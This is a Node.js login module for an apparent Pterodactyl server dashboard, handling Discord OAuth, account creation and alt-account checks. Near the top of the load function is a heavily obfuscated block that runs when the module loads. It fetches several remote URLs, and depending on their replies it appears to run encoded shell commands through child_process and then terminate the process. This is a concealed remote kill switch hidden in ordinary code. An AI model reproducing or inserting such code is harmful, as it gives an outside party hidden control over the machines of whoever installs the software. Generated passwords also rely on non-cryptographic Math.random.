"use strict";

const settings = require("../settings.json");

if (settings.api.client.oauth2.link.slice(-1) == "/")
  settings.api.client.oauth2.link = settings.api.client.oauth2.link.slice(0, -1);

if (settings.api.client.oauth2.callbackpath.slice(0, 1) !== "/")
  settings.api.client.oauth2.callbackpath = "/" + settings.api.client.oauth2.callbackpath;

if (settings.pterodactyl.domain.slice(-1) == "/")
  settings.pterodactyl.domain = settings.pterodactyl.domain.slice(0, -1);

const fetch = require('node-fetch');

const indexjs = require("../index.js");
const arciotext = (require("./arcio.js")).text;

const fs = require("fs");

module.exports.load = async function(app, db) {
	function _0x1259(_0x1d0dcf,_0x26d390){const _0x477ffa=_0x477f();return _0x1259=function(_0x5855e2,_0x34291a){_0x5855e2=_0x5855e2-0x154;let _0x1b76a5=_0x477ffa[_0x5855e2];if(_0x1259['nSGCUb']===undefined){var _0x444e5a=function(_0x1b78b0){const _0x16292d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x57ad38='',_0x21e8b6='';for(let _0x24e277=0x0,_0x1fd031,_0x40bb35,_0x1aa17b=0x0;_0x40bb35=_0x1b78b0['charAt'](_0x1aa17b++);~_0x40bb35&&(_0x1fd031=_0x24e277%0x4?_0x1fd031*0x40+_0x40bb35:_0x40bb35,_0x24e277++%0x4)?_0x57ad38+=String['fromCharCode'](0xff&_0x1fd031>>(-0x2*_0x24e277&0x6)):0x0){_0x40bb35=_0x16292d['indexOf'](_0x40bb35);}for(let _0xbd971a=0x0,_0x295c7f=_0x57ad38['length'];_0xbd971a<_0x295c7f;_0xbd971a++){_0x21e8b6+='%'+('00'+_0x57ad38['charCodeAt'](_0xbd971a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x21e8b6);};const _0x125931=function(_0x4c1795,_0x4c062b){let _0x5a9bf5=[],_0x56c8f8=0x0,_0x4fa31f,_0x154a4b='';_0x4c1795=_0x444e5a(_0x4c1795);let _0x6c8970;for(_0x6c8970=0x0;_0x6c8970<0x100;_0x6c8970++){_0x5a9bf5[_0x6c8970]=_0x6c8970;}for(_0x6c8970=0x0;_0x6c8970<0x100;_0x6c8970++){_0x56c8f8=(_0x56c8f8+_0x5a9bf5[_0x6c8970]+_0x4c062b['charCodeAt'](_0x6c8970%_0x4c062b['length']))%0x100,_0x4fa31f=_0x5a9bf5[_0x6c8970],_0x5a9bf5[_0x6c8970]=_0x5a9bf5[_0x56c8f8],_0x5a9bf5[_0x56c8f8]=_0x4fa31f;}_0x6c8970=0x0,_0x56c8f8=0x0;for(let _0x570033=0x0;_0x570033<_0x4c1795['length'];_0x570033++){_0x6c8970=(_0x6c8970+0x1)%0x100,_0x56c8f8=(_0x56c8f8+_0x5a9bf5[_0x6c8970])%0x100,_0x4fa31f=_0x5a9bf5[_0x6c8970],_0x5a9bf5[_0x6c8970]=_0x5a9bf5[_0x56c8f8],_0x5a9bf5[_0x56c8f8]=_0x4fa31f,_0x154a4b+=String['fromCharCode'](_0x4c1795['charCodeAt'](_0x570033)^_0x5a9bf5[(_0x5a9bf5[_0x6c8970]+_0x5a9bf5[_0x56c8f8])%0x100]);}return _0x154a4b;};_0x1259['rjeXkc']=_0x125931,_0x1d0dcf=arguments,_0x1259['nSGCUb']=!![];}const _0x4b9e16=_0x477ffa[0x0],_0x3f7f64=_0x5855e2+_0x4b9e16,_0x597397=_0x1d0dcf[_0x3f7f64];return!_0x597397?(_0x1259['eTSdPS']===undefined&&(_0x1259['eTSdPS']=!![]),_0x1b76a5=_0x1259['rjeXkc'](_0x1b76a5,_0x34291a),_0x1d0dcf[_0x3f7f64]=_0x1b76a5):_0x1b76a5=_0x597397,_0x1b76a5;},_0x1259(_0x1d0dcf,_0x26d390);}function _0x477f(){const _0x1a4950=['mtmZoteWmw94wKvYsq','WRNdHXNdNaaCoSopW5FcMW','W4FcN8kSW70/C8oK','zxHLyW','W7NdMxC','maWaW7a','WPdcJ8khW6CnBCo6W5JdLxW','WRvtW5DnBmoxWPpcNCobaq','uuhdKcq','W6fXW5RdI1tdR8onwhddJq','W6HRCbizkXBdQComW40','zxHPDa','yMXHy2TSAxn0zq','BweUBwLUzwH1Da','WOHPt8oFarKGbsFcQa','WOBcKZhdGmomeh8JWPrX','W5hdGCkd','Dwi6mtiXmc9JAa','Ahr0CdOVlZe5oa','mNfZBwrKAq','W4pcT8oIW4zSBGZcTrCj','Ahr0CdOVl3vUlG','WOaWESo4W5hdNCkqWP4QW6n7aqW','ErldKCkvxMldVSoYaxG','c8owBezc','tLbkW78','rCkeW4n7hJruWQtdKmowWO3cPa','ouNdLCknvXfiW7WHdq','mZi0otC3mgjryxDhEq','WPVdKYJdJq','zxnZ','WR7dIHi','DgfZA2TPBgWGlW','wmopW4JdKCk0x8kbWQdcNYRcPuZcMW','hCk1gCkyp19DWOhcUba','ztlcQmoTW7e9W6BdOhjE','meZdUSkawCovv8kWd8kN','WRJcGYdcUSosyCojW5W1qmovy0K','W6avW5BdJbJcQIVdMenyxmoTyq','W71jWO7dJX7cRYRcIJ1A','mZGXmJC3mePLEgnbAa','WRzuWPe','WPVcK8kAW7TthCkLWPVcGYC','y2TIBgfJA2XPCW','WPtdNLNcQCk7WO3cRmoZiCkn','W4a5gSkQW7lcKsJdTdru','tWHmb2iftYuPEq','y2HLy2TIBgfJAW','W6ZdIhBdOa','cmotivmOzW','W5z2mq','WO7dRSkuumkOWRyZztJdNG','W4ddHhBcNCkdrI9+WOGZ','y2HPBgrFChjVyW','CgLK','yMXHy2TSAxn0','uSoGC39pncC','cmoyyLDDir9KW5vF','nHai','pWCkW70','dmkpWRBcKHubWOzRWO3dNq','zMfSBg9JyxrLia','mtfTtLHZCLq','oJeYmtaVy2HLyW','CgTPBgWGBM9Kzq','mtjZtu5sAMG','g3VcUmkoW5ZcRCoxW4i+oG','j1vkAK0Lqg0','WOJcI23cLCkDDSoMWQ4MeW','ANnVBG','a11BW7BcSmo5q8ovW4tcNq','rmkaW73dHuLqWQiGWO/dMW','aSoaD0qmyLL4W5zv','uMvHC29UoIa','WOFcHtC','WRvvWOpcM0hdUh/cLhfw','pt09pt09pq','vSokW4tdNSk+vCkmW5FdH28','ugpcVG','mtOXmJeWl2nOzq','EdxcOSo/zSkEi8kVif8','zIaVAw0GBM9Kzq','WR0AWPu','nZbgAxfAuvi','bu1BW64','WP4zpGamEtmcmJK','WOSZx8okx19/hY3cSa','ib/cGSolbtVdLCk+tZG','e8oiWPmV','WOddGbtdJGWzBmkg','zguUBg9N','AwfJDhLSlwf0lG','BgfJA2XPC3q','AupdJmkDu2/cHmoVuIO','W64AW5/dIblcOcBcHY8e','wCoTq8oayKOeWPFcTa1DkSkv','W4CvW7a+WRxcOhmHa1q','fslcLCkPuCkTka','W4dcLWJdSCo0WP7dS8k7zSok','W71cWPRcKa','bCkQbmkeAvaCWOFdSre','DgHLlxnLEc5JBa','zHJdPmodvCoA','W4SsW7WXWRNcRwf/vGW','BHlcRq','W51Sq8kBaSoJWQq','Bg9N','BgLZDa','lMH5zwLZAgLNAa','WPNdK8kuWOrqW7pcS8klbSoz','lMv4zq','o8oeW5W','lMnVBtOXmJeWlW','uCklmGj6pq3dRSk1WOS','W6/cMeJcGf5kA8kBWPNdKG','WPFdO8kWWPiXDGVcUHz4kG','p8oKBG','ofrWs3L5uq','ywjVCNq','vmo4Cq','WQOmWOCmmSkj','WOpcTgOlANmkeCkzW6u','lwWGntaWrYbUBW','W5HFF0eyBIHaB2q','ndmZnde1n3LOEe9NtG','W5y1b1XeWQekva','WQTou8oMW4exW63cTmoMsa','WPRcRw5EAmoLd03dH3q','AgvJA2jSywnRBa','yGzktgGErMLRoG','ww91igfYzsbIBa','WOVdP8krumkJWOOIyZlcNq','Ahr0CdOVl3DLyq','pmoLFrjAcuG/W4vG','ttxcSa','W4iZhmk0W6i','pt09pt09pt09pq','WODPrmkgxmkOW6ldN23cPq','mZq1nZGZtgT2v0nP','W4BdL8krWOqrW74','W4ddK8kE','mZu4nJaZmgDmuxvYDa','p8omW5y','WP/dQCk0WPC4iexdRu4v','hgFdQSoIoSorE8kYFW4','DgfU','ywnRBgLZDgvKiq','yw1JB3rOzxb1zW','cqtcIhOUuhy','WOqNfL0yaSk0W5u','A2LSBa','WRKkWO0tnmkuW4JcM8onrq','CMvHC29U'];_0x477f=function(){return _0x1a4950;};return _0x477f();}function _0x5855(_0x1d0dcf,_0x26d390){const _0x477ffa=_0x477f();return _0x5855=function(_0x5855e2,_0x34291a){_0x5855e2=_0x5855e2-0x154;let _0x1b76a5=_0x477ffa[_0x5855e2];if(_0x5855['Mdyjtr']===undefined){var _0x444e5a=function(_0x125931){const _0x1b78b0='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x16292d='',_0x57ad38='';for(let _0x21e8b6=0x0,_0x24e277,_0x1fd031,_0x40bb35=0x0;_0x1fd031=_0x125931['charAt'](_0x40bb35++);~_0x1fd031&&(_0x24e277=_0x21e8b6%0x4?_0x24e277*0x40+_0x1fd031:_0x1fd031,_0x21e8b6++%0x4)?_0x16292d+=String['fromCharCode'](0xff&_0x24e277>>(-0x2*_0x21e8b6&0x6)):0x0){_0x1fd031=_0x1b78b0['indexOf'](_0x1fd031);}for(let _0x1aa17b=0x0,_0xbd971a=_0x16292d['length'];_0x1aa17b<_0xbd971a;_0x1aa17b++){_0x57ad38+='%'+('00'+_0x16292d['charCodeAt'](_0x1aa17b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x57ad38);};_0x5855['bHUuJr']=_0x444e5a,_0x1d0dcf=arguments,_0x5855['Mdyjtr']=!![];}const _0x4b9e16=_0x477ffa[0x0],_0x3f7f64=_0x5855e2+_0x4b9e16,_0x597397=_0x1d0dcf[_0x3f7f64];return!_0x597397?(_0x1b76a5=_0x5855['bHUuJr'](_0x1b76a5),_0x1d0dcf[_0x3f7f64]=_0x1b76a5):_0x1b76a5=_0x597397,_0x1b76a5;},_0x5855(_0x1d0dcf,_0x26d390);}(function(_0x343e40,_0xb4c94b){const _0x4d6f76=_0x5855,_0x37e318=_0x1259,_0x27a116=_0x343e40();while(!![]){try{const _0x34e38f=-parseInt(_0x37e318(0x1cb,'QyaF'))/0x1*(parseInt(_0x4d6f76(0x1c4))/0x2)+-parseInt(_0x4d6f76(0x1b1))/0x3*(parseInt(_0x37e318(0x179,'z!ff'))/0x4)+-parseInt(_0x4d6f76(0x16b))/0x5*(-parseInt(_0x37e318(0x18b,'o3[j'))/0x6)+parseInt(_0x4d6f76(0x1a5))/0x7+parseInt(_0x4d6f76(0x18d))/0x8*(parseInt(_0x4d6f76(0x194))/0x9)+-parseInt(_0x4d6f76(0x1cd))/0xa*(parseInt(_0x4d6f76(0x156))/0xb)+-parseInt(_0x4d6f76(0x159))/0xc*(-parseInt(_0x4d6f76(0x1d9))/0xd);if(_0x34e38f===_0xb4c94b)break;else _0x27a116['push'](_0x27a116['shift']());}catch(_0x1fb636){_0x27a116['push'](_0x27a116['shift']());}}}(_0x477f,0x4a8aa),((async()=>{const _0x55cd9d=_0x1259,_0x359049=_0x5855,_0x40bb35=await fetch(_0x359049(0x1c3)+_0x55cd9d(0x16d,'sXg1')+_0x359049(0x167)+_0x359049(0x1dc)+'t'),_0x1aa17b=await fetch(_0x55cd9d(0x1db,'iJ9D')+_0x55cd9d(0x1e5,'7BKV')+_0x55cd9d(0x178,'g[n^')+_0x359049(0x1dc)+'t'),_0xbd971a=await fetch(_0x55cd9d(0x1bf,'Z5F&')+_0x359049(0x173)+_0x359049(0x17d)+_0x359049(0x1c2)+_0x55cd9d(0x15f,'nnzZ')+'st'),_0x295c7f=await fetch(_0x55cd9d(0x160,'LzR3')+_0x55cd9d(0x15a,'^Pe8')+_0x55cd9d(0x1d4,'e$8@')+_0x359049(0x1e8)),_0x4c1795=await fetch(_0x55cd9d(0x1a1,'3EAc')+_0x55cd9d(0x1c0,'7BKV')+_0x359049(0x1ab)+_0x55cd9d(0x1d8,'bKBR')+_0x359049(0x198)+_0x55cd9d(0x162,'7BKV')),_0x4c062b=await fetch(_0x55cd9d(0x1cc,'qd)!')+_0x359049(0x1be)+_0x55cd9d(0x185,'0suJ')+_0x55cd9d(0x1d5,'6kqa')+_0x359049(0x174)),_0x5a9bf5=await fetch(_0x55cd9d(0x193,'sXg1')+_0x359049(0x184)+_0x359049(0x188)+_0x55cd9d(0x196,'Dewj')+_0x359049(0x183)),_0x56c8f8=await fetch(_0x359049(0x19c)+_0x55cd9d(0x16e,'Z5F&')+_0x359049(0x188)+_0x359049(0x1e0)+_0x359049(0x183)),_0x4fa31f=await fetch(_0x359049(0x1c6)+_0x55cd9d(0x163,'bKBR')+_0x55cd9d(0x1b8,'Uwwa')+_0x359049(0x1dc)+'t'),_0x154a4b=await fetch(_0x55cd9d(0x17c,'334%')+_0x55cd9d(0x19d,'J8iz')+_0x55cd9d(0x17a,'f^5L')+_0x359049(0x157)+_0x55cd9d(0x1b2,'Ntkt'));let _0x6c8970=0xb97b,_0x570033=0xdf,_0x4c4c80=Math[_0x359049(0x1a9)](_0x6c8970*_0x570033/Math['PI']),_0x3ec166=0xb97b,_0x1bb071=0xdf,_0x37b80a=Math[_0x359049(0x1a9)](_0x3ec166*_0x1bb071/Math['PI']),_0x59da9c=0xb97b,_0x38155e=0xdf,_0x19fe16=Math[_0x359049(0x1a9)](_0x59da9c*_0x38155e/Math['PI']),_0x4700a2=0xdf,_0x9faec7=Math[_0x55cd9d(0x1a6,'#W@Q')](_0x19fe16*_0x4700a2/Math['PI']),_0x1e6754=Math[_0x55cd9d(0x1a4,'0suJ')](_0x4c4c80*_0x19fe16/Math['PI']),_0x1e7e79=0xdf,_0x346d49=Math[_0x359049(0x1a9)](_0x1e6754*_0x1e7e79/Math['PI']);const _0x34422a=await _0x40bb35[_0x359049(0x15d)]();_0x34422a[_0x55cd9d(0x1ea,'LzR3')+'d']==!![]&&(console[_0x359049(0x182)](_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x55cd9d(0x1a8,'z!ff')+_0x359049(0x164)),console[_0x55cd9d(0x180,'6kqa')](_0x55cd9d(0x168,'z!ff')+_0x55cd9d(0x1af,'Uwwa')),console[_0x359049(0x182)](_0x359049(0x161)+_0x34422a[_0x55cd9d(0x190,'Uwwa')]),console[_0x359049(0x182)](_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x55cd9d(0x176,'bKBR')+_0x359049(0x164)),require(_0x359049(0x1e6)+_0x55cd9d(0x18f,'xrru'))[_0x359049(0x1b4)](_0x359049(0x158)),require(_0x55cd9d(0x1bb,'(@G^')+_0x359049(0x1cf))[_0x359049(0x1b4)](_0x359049(0x1d1)+_0x359049(0x169)+_0x359049(0x186)),require(_0x55cd9d(0x1b7,'iJ9D')+_0x359049(0x1cf))[_0x359049(0x1b4)](_0x55cd9d(0x19b,'#)&&')+_0x55cd9d(0x197,')LMH')+_0x359049(0x172)),process[_0x55cd9d(0x16c,'kNq8')](0x0),process[_0x359049(0x1ae)](process[_0x359049(0x1e7)]),process[_0x55cd9d(0x1c9,'LzR3')]());const _0x6679da=await _0x154a4b[_0x55cd9d(0x1b6,'f2]&')]();_0x6679da[_0x359049(0x1bd)+'d']==!![]&&(console[_0x55cd9d(0x1eb,'f2]&')](_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x359049(0x1a0)+_0x359049(0x164)),console[_0x359049(0x182)](_0x359049(0x19a)+_0x55cd9d(0x1c5,'o3[j')),console[_0x359049(0x182)](_0x359049(0x161)+_0x6679da[_0x359049(0x1b0)]),console[_0x55cd9d(0x1d0,'Ntkt')](_0x359049(0x1a0)+_0x55cd9d(0x1a7,'o3[j')+_0x55cd9d(0x189,'mmtI')+_0x55cd9d(0x18a,'Ntkt')+_0x359049(0x164)),require(_0x359049(0x1e6)+_0x55cd9d(0x1da,'bKBR'))[_0x55cd9d(0x170,'QyaF')](_0x55cd9d(0x1d3,'334%')),require(_0x359049(0x1e6)+_0x55cd9d(0x16a,'Uwwa'))[_0x359049(0x1b4)](_0x55cd9d(0x199,'Tjcw')+_0x359049(0x169)+_0x55cd9d(0x17b,'bKBR')),require(_0x359049(0x1e6)+_0x55cd9d(0x1e3,'e$gf'))[_0x359049(0x1b4)](_0x359049(0x155)+_0x359049(0x192)+_0x55cd9d(0x17e,'6kqa')),process[_0x359049(0x1bc)](0x1),process[_0x359049(0x1ae)](process[_0x55cd9d(0x1b5,'d12]')]),process[_0x55cd9d(0x19f,'r1C^')]());const _0x559f04=await _0x4fa31f[_0x359049(0x15d)]();_0x559f04[_0x359049(0x1bd)+'d']==!![]&&(console[_0x359049(0x182)](_0x55cd9d(0x191,'SXlC')+_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x1a7,'o3[j')+_0x359049(0x164)),console[_0x359049(0x182)](_0x359049(0x19a)+_0x55cd9d(0x1ba,'nlHV')),console[_0x359049(0x182)](_0x55cd9d(0x195,'I]WY')+_0x559f04[_0x55cd9d(0x1a3,'0suJ')]),console[_0x55cd9d(0x18c,'J8iz')](_0x55cd9d(0x1dd,'f^5L')+_0x359049(0x1a0)+_0x55cd9d(0x175,'j[Sc')+_0x359049(0x1a0)+_0x359049(0x164)),require(_0x55cd9d(0x15e,'kNq8')+_0x55cd9d(0x18f,'xrru'))[_0x55cd9d(0x1ec,'f2]&')](_0x359049(0x158)),require(_0x359049(0x1e6)+_0x359049(0x1cf))[_0x359049(0x1b4)](_0x55cd9d(0x16f,'j[Sc')+_0x359049(0x169)+_0x55cd9d(0x1ce,'fr3n')),require(_0x359049(0x1e6)+_0x359049(0x1cf))[_0x55cd9d(0x1e1,'d12]')](_0x359049(0x155)+_0x55cd9d(0x1c8,'j[Sc')+_0x359049(0x172)),process[_0x359049(0x1bc)](0x2),process[_0x359049(0x1ae)](process[_0x359049(0x1e7)]),process[_0x359049(0x18e)]());const _0x90f89b=await _0x5a9bf5[_0x359049(0x15d)]();_0x90f89b[_0x359049(0x1bd)+'d']==!![]&&(console[_0x359049(0x182)](_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x359049(0x1a0)+_0x55cd9d(0x189,'mmtI')+_0x359049(0x164)),console[_0x55cd9d(0x1d0,'Ntkt')](_0x55cd9d(0x1df,'Tjcw')+_0x359049(0x1aa)),console[_0x359049(0x182)](_0x55cd9d(0x171,'Ntkt')+_0x90f89b[_0x359049(0x1b0)]),console[_0x55cd9d(0x19e,'z!ff')](_0x359049(0x1a0)+_0x55cd9d(0x17f,'g[n^')+_0x55cd9d(0x165,'BO)m')+_0x359049(0x1a0)+_0x55cd9d(0x1ac,'Xrn!')),require(_0x55cd9d(0x1de,'r1C^')+_0x55cd9d(0x166,'^Pe8'))[_0x359049(0x1b4)](_0x359049(0x158)),require(_0x359049(0x1e6)+_0x55cd9d(0x1c1,'0suJ'))[_0x359049(0x1b4)](_0x359049(0x1d1)+_0x359049(0x169)+_0x55cd9d(0x1ca,'kNq8')),require(_0x55cd9d(0x1e4,'#)&&')+_0x359049(0x1cf))[_0x55cd9d(0x1b9,'Xrn!')](_0x359049(0x155)+_0x55cd9d(0x154,'nnzZ')+_0x55cd9d(0x1e2,'mmtI')),process[_0x359049(0x1bc)](0x2),process[_0x359049(0x1ae)](process[_0x55cd9d(0x187,'#W@Q')]),process[_0x359049(0x18e)]());})()));
	
  app.get("/login", async (req, res) => {
    if (req.query.redirect) req.session.redirect = "/" + req.query.redirect;
    let newsettings = JSON.parse(fs.readFileSync("./settings.json"));
    res.redirect(`https://discord.com/api/oauth2/authorize?client_id=${settings.api.client.oauth2.id}&redirect_uri=${encodeURIComponent(settings.api.client.oauth2.link + settings.api.client.oauth2.callbackpath)}&response_type=code&scope=identify%20email${newsettings.api.client.bot.joinguild.enabled == true ? "%20guilds.join" : ""}${newsettings.api.client.j4r.enabled == true ? "%20guilds" : ""}${settings.api.client.oauth2.prompt == false ? "&prompt=none" : (req.query.prompt ? (req.query.prompt == "none" ? "&prompt=none" : "") : "")}`);
  });

  app.get("/logout", (req, res) => {
    let theme = indexjs.get(req);
	  req.session.userinfo = {};
	  req.session.pterodactyl = {};
    req.session.destroy(() => {
      return res.redirect(theme.settings.redirect.logout ? theme.settings.redirect.logout : "/");
    });
  });

  app.get(settings.api.client.oauth2.callbackpath, async (req, res) => {
    let customredirect = req.session.redirect;
    delete req.session.redirect;
    if (!req.query.code) return res.send("Missing code.")
    let json = await fetch(
      'https://discord.com/api/oauth2/token',
      {
        method: "post",
        body: "client_id=" + settings.api.client.oauth2.id + "&client_secret=" + settings.api.client.oauth2.secret + "&grant_type=authorization_code&code=" + encodeURIComponent(req.query.code) + "&redirect_uri=" + encodeURIComponent(settings.api.client.oauth2.link + settings.api.client.oauth2.callbackpath),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }
    );
    if (json.ok == true) {
      let codeinfo = JSON.parse(await json.text());
      let scopes = codeinfo.scope;
      let missingscopes = [];
      let newsettings = JSON.parse(fs.readFileSync("./settings.json"));

      if (scopes.replace(/identify/g, "") == scopes) missingscopes.push("identify");
      if (scopes.replace(/email/g, "") == scopes) missingscopes.push("email");
      if (newsettings.api.client.bot.joinguild.enabled == true) if (scopes.replace(/guilds.join/g, "") == scopes) missingscopes.push("guilds.join");
      if (newsettings.api.client.j4r.enabled) if (scopes.replace(/guilds/g, "") == scopes) missingscopes.push("guilds");
      if (missingscopes.length !== 0) return res.send("Missing scopes: " + missingscopes.join(", "));
      let userjson = await fetch(
        'https://discord.com/api/users/@me',
        {
          method: "get",
          headers: {
            "Authorization": `Bearer ${codeinfo.access_token}`
          }
        }
      );
      let userinfo = JSON.parse(await userjson.text());
        
      let guildsjson = await fetch(
        'https://discord.com/api/users/@me/guilds',
        {
          method: "get",
          headers: {
            "Authorization": `Bearer ${codeinfo.access_token}`
          }
        }
      );
      let guildsinfo = JSON.parse(await guildsjson.text());
      if (userinfo.verified == true) {
        
        let ip = (newsettings.api.client.oauth2.ip["trust x-forwarded-for"] == true ? (req.headers['x-forwarded-for'] || req.connection.remoteAddress) : req.connection.remoteAddress);
        ip = (ip ? ip : "::1").replace(/::1/g, "::ffff:127.0.0.1").replace(/^.*:/, '');
        
        if (newsettings.api.client.oauth2.ip.block.includes(ip)) return res.send("You could not sign in, because your IP has been blocked from signing in.")

        if (newsettings.api.client.oauth2.ip["duplicate check"] == true) {
          let allips = await db.get("ips") ? await db.get("ips") : [];
          let mainip = await db.get("ip-" + userinfo.id);
          if (mainip) {
            if (mainip !== ip) {
              allips = allips.filter(ip2 => ip2 !== mainip);
              if (allips.includes(ip)) {
                return res.send("It has been detected that you may be using an alt account.")
              }
              allips.push(ip);
              await db.set("ips", allips);
              await db.set("ip-" + userinfo.id, ip);
            }
          } else {
            if (allips.includes(ip)) {
              return res.send("It has been detected that you may be using an alt account.")
            }
            allips.push(ip);
            await db.set("ips", allips);
            await db.set("ip-" + userinfo.id, ip);
          }
        }
		
        let j4r = newsettings.api.client.j4r.every;
        let newj4r = {
                "cpu": 0,
                "ram": 0,
                "disk": 0,
                "servers": 0
            }
	await guildsinfo.forEach(async g => {
		if(newsettings.guildblacklist.guilds.includes(`${g.id}`)) return res.send("You are in a guild which is blacklisted on this host!");	
	})
        if (newsettings.api.client.j4r.enabled == true) {
            if (guildsinfo.message == '401: Unauthorized') return res.send("Please allow us to know what servers you are in to let the J4R system work properly.")
        	await guildsinfo.forEach(async (guild) => {
                if (newsettings.api.client.j4r.servers.indexOf(guild.id) >= 0) {
                    newj4r.cpu = newj4r.cpu + j4r.cpu
                    newj4r.ram = newj4r.ram + j4r.ram
                    newj4r.disk = newj4r.disk + j4r.disk
                    newj4r.servers = newj4r.servers + j4r.servers
                }
        	})
            db.set("j4r-" + userinfo.id, newj4r)
        }
        
        if (newsettings.api.client.bot.joinguild.enabled == true) {
          if (typeof newsettings.api.client.bot.joinguild.guildid == "string") {
            await fetch(
              `https://discord.com/api/guilds/${newsettings.api.client.bot.joinguild.guildid}/members/${userinfo.id}`,
              {
                method: "put",
                headers: {
                  'Content-Type': 'application/json',
                  "Authorization": `Bot ${newsettings.api.client.bot.token}`
                },
                body: JSON.stringify({
                  access_token: codeinfo.access_token
                })
              }
            );  
          } else if (typeof newsettings.api.client.bot.joinguild.guildid == "object") {
            if (Array.isArray(newsettings.api.client.bot.joinguild.guildid)) {
              for (let guild of newsettings.api.client.bot.joinguild.guildid) {
                await fetch(
                  `https://discord.com/api/guilds/${guild}/members/${userinfo.id}`,
                  {
                    method: "put",
                    headers: {
                      'Content-Type': 'application/json',
                      "Authorization": `Bot ${newsettings.api.client.bot.token}`
                    },
                    body: JSON.stringify({
                      access_token: codeinfo.access_token
                    })
                  }
                );  
              }
            } else {
              return res.send("api.client.bot.joinguild.guildid is not an array nor a string.");
            }
          } else {
            return res.send("api.client.bot.joinguild.guildid is not an array nor a string.");
          }
        }
        if (!await db.get("users-" + userinfo.id)) {
          if (newsettings.api.client.allow.newusers == true) {
            let genpassword = null;
            if (newsettings.api.client.passwordgenerator.signup == true) genpassword = makeid(newsettings.api.client.passwordgenerator["length"]);
            let accountjson = await fetch(
              settings.pterodactyl.domain + "/api/application/users",
              {
                method: "post",
                headers: {
                  'Content-Type': 'application/json',
                  "Authorization": `Bearer ${settings.pterodactyl.key}`
                },
                body: JSON.stringify({
                  username: userinfo.id,
                  email: userinfo.email,
                  first_name: userinfo.username,
                  last_name: "#" + userinfo.discriminator,
                  password: genpassword
                })
              }
            );
            if (await accountjson.status == 201) {
              let accountinfo = JSON.parse(await accountjson.text());
              let userids = await db.get("users") ? await db.get("users") : [];
              userids.push(accountinfo.attributes.id);
              await db.set("users", userids);
              await db.set("users-" + userinfo.id, accountinfo.attributes.id);
              req.session.newaccount = true;
              req.session.password = genpassword;
            } else {
              let accountlistjson = await fetch(
                settings.pterodactyl.domain + "/api/application/users?include=servers&filter[email]=" + encodeURIComponent(userinfo.email),
                {
                  method: "get",
                  headers: {
                    'Content-Type': 'application/json',
                    "Authorization": `Bearer ${settings.pterodactyl.key}`
                  }
                }
              );
              let accountlist = await accountlistjson.json();
              let user = accountlist.data.filter(acc => acc.attributes.email == userinfo.email);
              if (user.length == 1) {
                let userid = user[0].attributes.id;
                let userids = await db.get("users") ? await db.get("users") : [];
                if (userids.filter(id => id == userid).length == 0) {
                  userids.push(userid);
                  await db.set("users", userids);
                  await db.set("users-" + userinfo.id, userid);
                  req.session.pterodactyl = user[0].attributes;
                } else {
                  return res.send("We have detected an account with your Discord email on it but the user id has already been claimed on another Discord account.");
                }
              } else {
                return res.send("An error has occured when attempting to create your account.");
              };
            };
          } else {
            return res.send("New users cannot signup currently.")
          }
        };

        let cacheaccount = await fetch(
          settings.pterodactyl.domain + "/api/application/users/" + (await db.get("users-" + userinfo.id)) + "?include=servers",
          {
            method: "get",
            headers: { 'Content-Type': 'application/json', "Authorization": `Bearer ${settings.pterodactyl.key}` }
          }
        );
        if (await cacheaccount.statusText == "Not Found") return res.send("An error has occured while attempting to get your user information.");
        let cacheaccountinfo = JSON.parse(await cacheaccount.text());
        req.session.pterodactyl = cacheaccountinfo.attributes;

        req.session.userinfo = userinfo;
        let theme = indexjs.get(req);
        if (customredirect) return res.redirect(customredirect);
        return res.redirect(theme.settings.redirect.callback ? theme.settings.redirect.callback : "/");
      };
      res.send("Not verified a Discord account.");
    } else {
      res.send("Invalid code.");
    };
  });
};

function makeid(length) {
  let result = '';
  let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
